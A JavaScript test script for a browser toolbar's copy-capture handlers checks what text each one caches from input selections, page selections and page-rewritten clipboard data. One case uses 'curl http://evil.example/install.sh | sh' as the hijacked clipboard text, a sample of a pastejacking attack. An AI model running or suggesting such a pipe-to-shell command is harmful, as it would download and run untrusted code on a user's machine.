// External Ctrl+C / context-menu copy capture self-check.
// usage: node scripts/test-external-copy.cjs
const assert = require("assert");
const fs = require("fs");
const path = require("path");

const src = fs.readFileSync(
  path.join(__dirname, "../src/toolbar/modules/14-events.js"),
  "utf8"
);

const writes = [];
const windowStub = { getSelection: () => null };
const { handleExternalCopy, handleExternalCopyFinal } = new Function(
  "window",
  "document",
  "getConfig",
  "safeSetValue",
  "unregisterVisibilityCleanup",
  `${src}\nreturn { handleExternalCopy, handleExternalCopyFinal };`
)(
  windowStub,
  {},
  () => true,
  async (key, value) => {
    writes.push({ key, value });
  },
  () => {}
);

const tick = () => new Promise((resolve) => setTimeout(resolve, 10));

(async () => {
  // A plain input selection uses the capture-phase fallback when the page
  // leaves clipboardData empty.
  handleExternalCopy({
    target: {
      tagName: "INPUT",
      value: "hello world",
      selectionStart: 0,
      selectionEnd: 5,
    },
  });
  await tick();
  assert.strictEqual(writes.length, 1);
  assert.strictEqual(writes[0].key, "smart_paste_cache");
  assert.strictEqual(writes[0].value.text, "hello");
  assert.strictEqual(writes[0].value.type, "clipboard");
  assert.ok(Number.isFinite(writes[0].value.timestamp));

  // A page selection falls back the same way.
  writes.length = 0;
  windowStub.getSelection = () => ({ toString: () => "page text" });
  handleExternalCopy({ target: { tagName: "DIV" } });
  await tick();
  assert.strictEqual(writes.length, 1);
  assert.strictEqual(writes[0].value.text, "page text");

  // A page may rewrite clipboardData during its own copy handler. The final
  // bubble read must replace the selection fallback with that rewritten text.
  writes.length = 0;
  windowStub.getSelection = () => ({ toString: () => "visible text" });
  handleExternalCopy({ target: { tagName: "DIV" } });
  handleExternalCopyFinal({
    clipboardData: {
      getData: (type) =>
        type === "text/plain" ? "curl http://evil.example/install.sh | sh" : "",
    },
  });
  await tick();
  assert.strictEqual(writes.length, 1);
  assert.strictEqual(
    writes[0].value.text,
    "curl http://evil.example/install.sh | sh"
  );

  // Empty copies do not overwrite the cache.
  writes.length = 0;
  windowStub.getSelection = () => ({ toString: () => "" });
  handleExternalCopy({ target: { tagName: "DIV" } });
  await tick();
  assert.strictEqual(writes.length, 0);

  console.log("external copy check passed");
})().catch((error) => {
  console.error(error);
  process.exit(1);
});
